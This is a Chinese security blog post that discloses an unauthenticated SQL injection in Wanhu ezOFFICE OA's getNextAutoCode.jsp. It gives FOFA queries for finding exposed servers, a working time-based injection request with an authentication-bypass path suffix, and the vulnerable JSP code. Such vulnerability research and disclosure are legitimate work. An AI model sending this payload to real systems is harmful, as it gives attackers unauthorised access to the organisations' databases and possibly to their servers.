---
title: "万户OA getNextAutoCode.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-getNextAutoCode-sqli.html
asset_dir: assets/万户oa-getnextautocode.jsp-sql注入漏洞
---

# 万户OA getNextAutoCode.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/9 19:57
* 991浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

防火墙软件

网络安全课程

代码安全审计


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入检测工具

# 0x02 漏洞概述

万户 ezOFFICE getNextAutoCode.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

注意由两个路径，代码都是一样的

> platform/custom/custom\_form/run/checkform/getNextAutoCode.jsp  
> platform/custom/ezform/run/getNextAutoCode.jsp
>
> 代码安全审计

```
GET /defaultroot/platform/custom/custom_form/run/checkform/getNextAutoCode.jsp;.js?fieldId=1+WAITFOR+DELAY+'00:00:03'--&fieldName=2&orgName=4&tableId=3 HTTP/1.1
Host: 192.168.22.187:7001
```

成功延时 3 秒

深入探索

云安全解决方案

在线安全工具

VPN服务

[[![万户OA getNextAutoCode.jsp SQL注入漏洞](images/img-001-3632b6b51d45.png)](https://mrxn.net/content/uploadfile/202501/92a41736424383.png)](https://mrxn.net/content/uploadfile/202501/92a41736424383.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

getNextAutoCode.jsp 代码如下，非常简单！

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
request.setCharacterEncoding("UTF-8");
String fieldId = request.getParameter("fieldId");
String fieldName = request.getParameter("fieldName");
String tableId = request.getParameter("tableId");
String orgName = request.getParameter("orgName");
response.setContentType("text/html; charset=UTF-8");
response.setHeader("Cache-Control","no-cache");
com.whir.ezoffice.customdb.customdb.bd.AutoCode ac = new com.whir.ezoffice.customdb.customdb.bd.AutoCode();
String ret = ac.getAutoCode(fieldId, fieldName, tableId, orgName, null);
out.print(ret);
%>
```

`getAutoCode` 函数如下

漏洞扫描服务

[[![万户OA getNextAutoCode.jsp SQL注入漏洞](images/img-002-54c81f744082.png)](https://mrxn.net/content/uploadfile/202501/393f1736424040.png)](https://mrxn.net/content/uploadfile/202501/393f1736424040.png)

`fieldId` 通过 `request.getParameter` 获取后进入 `getAutoCode` 函数，直接拼接进 `SQL` 语句，然后执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，也是这么朴实无华！

物流软件安全

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.0x01 产品简介](#toc-1-)
* [2.0x02 漏洞概述](#toc-2-)
* [3.0x03 复现环境](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [5.漏洞分析](#toc-5-)
* [6.最后](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户OA getNextAutoCode.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-getNextAutoCode-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-getNextAutoCode-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-getNextAutoCode-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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